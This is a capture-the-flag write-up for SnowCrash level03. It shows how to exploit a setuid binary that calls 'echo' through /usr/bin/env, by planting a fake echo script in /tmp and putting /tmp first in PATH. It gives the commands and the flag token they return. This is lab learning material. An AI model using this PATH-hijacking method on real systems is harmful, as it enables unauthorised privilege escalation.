# Level03

- We spawn with a `level03` file in root repository
- No extension so I try to execute it and it prints 'Exploit me'
- Then I try to *cat* the file but its unreadable
- Using 'file'
	> `level03: setuid setgid ELF 32-bit LSB executable`
- So second thing I did is to try and use `GDB` with asm layout to understand the code
- Didn't quite work on my machine so I did it on the snow-crash VM
- I still wanted to get a good look at the file so I used:
	> `objdump -M Intel -d level03`
	> The -M Intel to get a more understandable asm for me
- Code was still kinda bad so I did a little script to make it cleaner
	> `sh cutlines.sh`
- We can see many calls but one of them is a system one
- So when we look into it on `gdb`
	> `0x80485e0:       "/usr/bin/env echo Exploit me"`
- It seems like `echo` is vulnerable to manipulation since it's called using `/usr/bin/env` which makes the computer use the first binary found in `PATH`
- So we should be able to create a script called echo to get the flag for us !
	> `echo 'getflag' > /tmp/echo`
	> `export PATH=/tmp:$PATH`
	> `./level03`
- DOESN'T WORK ! WHY ? (Well I forgot a little something)
	> `chmod +x /tmp/echo`
	> `./level03`
	> `Check flag.Here is your token : qi0maab88jeaj46qoumi7maus`
